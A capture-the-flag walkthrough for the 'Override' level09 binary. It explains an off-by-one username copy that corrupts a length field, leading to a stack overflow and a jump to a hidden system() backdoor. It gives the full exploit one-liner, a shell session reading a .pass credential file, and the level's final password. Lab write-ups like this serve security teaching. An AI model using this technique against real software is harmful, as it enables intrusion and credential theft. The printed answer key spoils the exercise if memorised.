# Override — Level09 Walkthrough

## 1. Initial Behavior

The binary `level09` is a secure messaging service named "l33t-m$n". It asks for a **username** and a **message** to send.

```bash
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: user
>: Welcome, user
>: Msg @Unix-Dude
>>: Hello
>: Msg sent!

```

Under normal use, it simply accepts input and prints confirmation.

---

## 2. Binary Analysis

We are provided with the source code (`level09.c`) and a disassembly dump (`dump.s`). The program uses a **C++ class-like structure** simulated in C, where a buffer holds both data (username, message) and metadata (lengths).

### The Vulnerability: Off-by-One & Length Overwrite

The vulnerability stems from how the `set_username` function handles the username copy loop.

**Structure Layout (Inferred):**
In `handle_msg`, a buffer of 140 bytes is allocated, but the stack layout groups it with other variables.

* `buffer[0...139]`: Message body.
* `buffer[140...179]`: Username (40 bytes).
* `buffer[180...183]`: **Message Length** (Integer, 4 bytes).

**The Bug in `set_username`:**

```c
// level09.c
int __fastcall set_username(__int64 buffer) {
    char s[140];
    fgets(s, 128, stdin); 
    // VULNERABILITY: i goes from 0 to 40 (41 iterations)
    for ( i = 0; i <= 40 && s[i]; ++i )
        *(_BYTE *)(buffer + i + 140) = s[i];
    return printf(">: Welcome, %s", ...);
}

```

The loop runs for `i = 0` to `40`, writing **41 bytes**.

* Bytes `0` to `39` fill the username slot (`buffer[140]` to `buffer[179]`).
* Byte `40` writes to `buffer[180]`.

**`buffer[180]` is the first byte of the Message Length variable.**
By providing a 41-byte username, we can overwrite the least significant byte (LSB) of the message length. If we set this to a high value (like `0xFF`), we can trick the subsequent `set_msg` function into copying more data than the buffer can hold.

---

## 3. Exploitation Strategy

We need to chain two inputs to trigger a stack buffer overflow and redirect execution to a hidden function.

1. **Overwrite Length (via Username):** Send 40 chars of padding + 1 byte (`0xFF`). This changes the allowed message length from the default (140) to something much larger (e.g., 255+).
2. **Buffer Overflow (via Message):** `set_msg` uses `strncpy` with the corrupted length. We can now overflow the `handle_msg` stack frame.
3. **Target Function:** There is a hidden function `secret_backdoor` at offset `0x88c`.

### Calculating Offsets

* **Buffer Position:** `handle_msg` allocates variables at `rbp - 0xC0` (192 bytes).
* **Target (Return Address):** Located at `rbp + 0x8`.
* **Distance:** `0xC0 + 0x8 = 200 bytes`.
* **Target Address:** The binary is PIE (Position Independent Executable). Using the crash dump or `dmesg`, we identified the base address as `0x555555554000`.
* `secret_backdoor` = `0x555555554000` + `0x88c` = `0x55555555488c`.



---

## 4. Crafting the Payload

This exploit is tricky because `fgets` buffers input.

1. **The Username Payload:**
* 40 bytes of padding (`'A'`).
* 1 byte to overwrite length (`\xFF`).
* **Crucial Note:** `set_username` calls `fgets(s, 128, stdin)`. It will read 128 bytes from our input stream. Since we only use 41 bytes for the username, the remaining **87 bytes** (128 - 41) are "eaten" by this first `fgets` but ignored by the copy loop.


2. **The Message Payload:**
* We need to hit the offset of **200 bytes** *inside* `set_msg`.
* Since the first `fgets` ate 87 bytes of our input stream, we must pad our payload so that the "real" payload starts exactly where the second `fgets` (in `set_msg`) begins reading.
* **Total Padding needed:** 200 bytes (to reach ret) + 87 bytes (wasted by username fgets) = **287 bytes**.



### The Python Script

We combine everything into one stream:

```python
# 'A'*40 + '\xff' -> Triggers length overwrite
# '1'*286         -> Fills the rest of username buffer + message buffer to reach EIP
# Address         -> The secret_backdoor function
# \n              -> To terminate the input

```

The final command logic:

```bash
(python -c "import sys; sys.stdout.write('A' * 40 + '\xff' + '1' * 286 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n')"; cat) | ./level09

```

---

## 5. Exploitation

Running the exploit triggers the `secret_backdoor` function. This function executes `fgets(s, 128, stdin)` followed by `system(s)`. This means it waits for *one more command* from us.

Because we used `(python ... ; cat)`, the pipe stays open. Once the exploit lands, we can simply type commands.

```bash
level09@OverRide:~$ (python -c "import sys; sys.stdout.write('A' * 40 + '\xff' + '1' * 286 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n')"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh                <-- Type this blindly after it prints "Msg sent!"
ls
end

```

The `secret_backdoor` silently runs `/bin/sh`.

---

## 6. Retrieving the Password

With the shell active, read the password for the final level:

```bash
cat /home/users/end/.pass

```

**Output:**

```text
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

```

## 🏁 Final Password

```text
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

```